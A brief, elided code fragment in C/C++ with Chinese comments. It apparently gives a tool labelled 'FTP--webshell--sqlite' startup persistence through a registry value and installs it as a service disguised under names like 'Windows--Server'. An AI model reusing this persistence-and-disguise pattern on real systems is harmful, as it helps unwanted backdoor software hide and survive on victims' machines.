...
void RegMe(void)  //注册表启动
{
	...
	::RegSetValueEx(phkResult,"FTP--webshell--sqlite--0.2",0,REG_SZ,(BYTE*)lpValue.GetBuffer(0),lpValue.GetLength());  //写入注册表内容
...
{
	RegMe();  //注册表启动
	AddServices("ftp--Server" ,"Windows--Server", "FTP--webshell--sqlite--0.1");  
	if(argv[1]==NULL)
	{
